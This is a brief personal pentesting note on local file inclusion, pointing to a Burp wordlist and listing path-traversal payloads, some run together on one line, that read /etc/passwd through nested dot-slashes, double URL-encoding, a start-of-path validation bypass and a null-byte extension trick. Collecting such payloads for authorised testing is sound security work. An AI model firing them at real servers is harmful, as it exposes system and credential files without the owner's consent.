[[LFI Automation using my scrip lfi-h0tak88r.sh]]

- **manually using Burp and wordlist** [`**lfi.txt**`](https://github.com/M8SZT8/Security-Hub/blob/main/Fuzzing%20Lists/lfi.txt)

```
filename=....//....//....//etc/passwd..%252f..%252f..%252fetc/passwd/var/www/images/../../../etc/passwd -> validation of the start of the file ../../../etc/passwd%00.png
```